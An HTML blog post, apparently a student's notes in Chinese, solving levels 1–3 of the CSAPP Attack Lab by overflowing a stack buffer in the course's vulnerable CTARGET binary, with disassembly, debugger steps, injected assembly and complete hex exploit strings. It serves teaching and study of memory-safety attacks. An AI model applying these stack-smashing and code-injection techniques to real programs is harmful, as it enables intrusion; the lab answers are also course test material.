@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"fuhy.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"hide","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="重新做了一遍CSAPP里的Attack Lab～">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Attack Lab">
+<meta property="og:url" content="https://fuhy.github.io/note-of-attack-lab/">
+<meta property="og:site_name" content="Alfred&#39;s Blog">
+<meta property="og:description" content="重新做了一遍CSAPP里的Attack Lab～">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2017-07-04T20:41:02.000Z">
+<meta property="article:modified_time" content="2022-08-08T08:37:40.892Z">
+<meta property="article:author" content="Alfred Fu">
+<meta property="article:tag" content="Note">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://fuhy.github.io/note-of-attack-lab/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Attack Lab | Alfred's Blog</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-JGSH933PYM"></script>
+    <script>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-JGSH933PYM');
+      }
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Alfred's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://fuhy.github.io/note-of-attack-lab/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Alfred Fu">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Alfred's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Attack Lab
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2017-07-05 04:41:02" itemprop="dateCreated datePublished" datetime="2017-07-05T04:41:02+08:00">2017-07-05</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-08-08 16:37:40" itemprop="dateModified" datetime="2022-08-08T16:37:40+08:00">2022-08-08</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>重新做了一遍CSAPP里的Attack Lab～</p>
+<span id="more"></span>
+
+<h1 id="CTARGET"><a href="#CTARGET" class="headerlink" title="CTARGET"></a>CTARGET</h1><blockquote>
+<p>For the first three phases, your exploit strings will attack CTARGET. </p>
+<p>This program is set up in a way that the stack positions will be consistent from one run to the next and so that data on the stack can be treated as executable code. These features make the program vulnerable to attacks where the exploit strings contain the byte encodings of executable code.</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span> </span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> val;</span><br><span class="line">	val = getbuf();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="title function_">getbuf</span><span class="params">()</span> </span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> buf[BUFFER_SIZE];</span><br><span class="line">	Gets(buf);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><p>需要输入特定长度的字符串让<code>getbuf()</code>在返回时将控制流转移到<code>touch1()</code></p>
+<p>反编译<code>getbuf</code>：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(lldb) disas -n getbuf</span><br><span class="line">ctarget`getbuf:</span><br><span class="line">ctarget[0x4017a8] &lt;+0&gt;:  subq   <span class="variable">$0x28</span>, %rsp</span><br><span class="line">ctarget[0x4017ac] &lt;+4&gt;:  movq   %rsp, %rdi</span><br><span class="line">ctarget[0x4017af] &lt;+7&gt;:  callq  0x401a40                  ; Gets at support.c:163</span><br><span class="line">ctarget[0x4017b4] &lt;+12&gt;: movl   <span class="variable">$0x1</span>, %eax</span><br><span class="line">ctarget[0x4017b9] &lt;+17&gt;: addq   <span class="variable">$0x28</span>, %rsp</span><br><span class="line">ctarget[0x4017bd] &lt;+21&gt;: retq</span><br></pre></td></tr></table></figure>
+
+<p>可以看到在栈上分配了0x28的空间给Gets。因此只需要输入大小为0x28的Bytes就可以达到ret的地址。</p>
+<blockquote>
+<p>0x28字节即是40字节🙄️</p>
+</blockquote>
+<p>反编译<code>touch1</code>：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(lldb) disas -n touch1</span><br><span class="line">ctarget`touch1:</span><br><span class="line">ctarget[0x4017c0] &lt;+0&gt;:  subq   <span class="variable">$0x8</span>, %rsp</span><br></pre></td></tr></table></figure>
+
+<p>得到touch1的地址<code>0x4017c0</code>. 在x86-64上即为<code>c01740000000000</code>.</p>
+<p>所以构建的字符串为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><blockquote>
+<p>Your task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case, however, you must make it appear to touch2 as if you have passed your cookie as its argument. </p>
+</blockquote>
+<p>这个lab压缩包里的cookie为<code>0x59b997fa</code>.</p>
+<p>现需要将cookie传递给<code>touch2()</code>,</p>
+<p>既是覆盖掉<code>%rdi</code>（存储第一个参数的寄存器）中的值并调用<code>touch2()</code>.</p>
+<p>可通过以下汇编指令达成:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq cookie, %rdi  #将cookie的值赋给%rdi</span><br><span class="line">push &amp;(touch2())   #将touch2()的地址入栈</span><br><span class="line">ret                #从栈中弹出返回地址并转到此地址</span><br></pre></td></tr></table></figure>
+
+<p>反汇编<code>touch2()</code>：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(lldb) disas -n touch2</span><br><span class="line">ctarget`touch2:</span><br><span class="line">ctarget[0x4017ec] &lt;+0&gt;:  subq   <span class="variable">$0x8</span>, %rsp</span><br></pre></td></tr></table></figure>
+
+<p>得到地址为<code>0x4017ec</code>.</p>
+<p>填入得到汇编指令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x59b997fa, %rdi</span><br><span class="line">push $0x4017ec </span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>别忘了立即数前的$, gcc并不会报错🙄️</p>
+</blockquote>
+<p>调用汇编器(as)得到字节码，再反汇编:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -c code.s</span><br><span class="line">$ objdump -d code.o</span><br></pre></td></tr></table></figure>
+
+<p>显示如下：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">./code.o:	file format Mach-O 64-bit x86-64</span><br><span class="line"></span><br><span class="line">Disassembly of section __TEXT,__text:</span><br><span class="line">__text:</span><br><span class="line">       0:	48 c7 c7 fa 97 b9 59 	movq	<span class="variable">$1505335290</span>, %rdi</span><br><span class="line">       7:	68 ec 17 40 00 	pushq	<span class="variable">$4200428</span></span><br><span class="line">       c:	c3 	retq</span><br></pre></td></tr></table></figure>
+
+<p>因此可以通过这段字节码完成题目所给的要求。但还需要让机器执行此段代码，仿Level1，可让<code>getbuf()</code>返回到此段代码的起始位置(即<code>buf[BUFFER_SIZE]</code>的起始位置).</p>
+<p>通过gdb设置断点来查看调用Gets之前栈指针的位置。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ gdb ./ctarget</span><br><span class="line">(gdb) b *0x4017ac</span><br><span class="line">(gdb) run -q &lt;./code</span><br><span class="line">(gdb) info r</span><br><span class="line">(gdb) disas</span><br></pre></td></tr></table></figure>
+
+<p>本机上进入<code>getbuf()</code>时<code>%rsp</code>的值为<code>0x5561dc78</code>.</p>
+<p>所以可以得到字符串为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68 </span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><blockquote>
+<p>Your task is to get CTARGET to execute the code for touch3 rather than returning to test. You must make it appear to touch3 as if you have passed a string representation of your cookie as its argument.</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hexmatch</span><span class="params">(<span class="type">unsigned</span> val, <span class="type">char</span> *sval)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">    <span class="type">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">touch3</span><span class="params">(<span class="type">char</span> *sval)</span></span><br><span class="line">&#123;</span><br><span class="line">    vlevel = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (hexmatch(cookie, sval))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">        fail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>类似前两题，同样是传递参数给新的函数。</p>
+<p>传递的字符串为cookie，即<code>0x59b997fa</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>
+
+<p>可通过以下汇编指令达成:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq &amp;string, %rdi  #将字符串地址的值赋给%rdi</span><br><span class="line">pushq &amp;(touch3())    #将touch3()的地址入栈</span><br><span class="line">ret                 #从栈中弹出返回地址并转到此地址</span><br></pre></td></tr></table></figure>
+
+<p>反汇编得到<code>touch3()</code>的地址<code>0x4018fa</code>.</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(lldb) disas -n touch3</span><br><span class="line">ctarget`touch3:</span><br><span class="line">ctarget[0x4018fa] &lt;+0&gt;:   pushq  %rbx</span><br><span class="line">ctarget[0x4018fb] &lt;+1&gt;:   movq   %rdi, %rbx</span><br></pre></td></tr></table></figure>
+
+<p>在调用<code>touch3()</code>的时候，函数会继续调用<code>hexmatch()</code>，因此得考虑字符串会不会被覆盖.</p>
+<p>可以考虑把字符存进test()的栈帧中（反正也不会用到了</p>
+<table>
+<thead>
+<tr>
+<th align="left">Address</th>
+<th align="left">Stack</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">0x5561dc78 + 0x28 +0x8</td>
+<td align="left">保存test()函数的状态</td>
+</tr>
+<tr>
+<td align="left">0x5561dc78 + 0x28</td>
+<td align="left">返回地址</td>
+</tr>
+<tr>
+<td align="left">0x5561dc78</td>
+<td align="left">getbuf中开辟的buffer[]数组</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left">保存getbuf()函数的状态</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>注意到栈向低地址方向生长</p>
+</blockquote>
+<p>从Level 2中得到调用Gets之前栈指针<code>0x5561dc78</code>，加上48个字节后为<code>0x5561dca8</code>，即为想存储的字符串的地址。因此输入的汇编指令应为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x5561dca8, %rdi</span><br><span class="line">pushq $0x4018fa</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p>所以构建的输入流应该长这样:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68 </span><br><span class="line">fa 18 40 00 c3 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Note/" rel="tag"># Note</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/socket-web-programming/" rel="next" title="Socket网络编程">
+      Socket网络编程 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CTARGET"><span class="nav-number">1.</span> <span class="nav-text">CTARGET</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-1"><span class="nav-number">1.1.</span> <span class="nav-text">Level 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-2"><span class="nav-number">1.2.</span> <span class="nav-text">Level 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Level-3"><span class="nav-number">1.3.</span> <span class="nav-text">Level 3</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Alfred Fu</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/fuhy" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;fuhy" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/alfredhy" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;alfredhy" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i></a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Alfred Fu</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
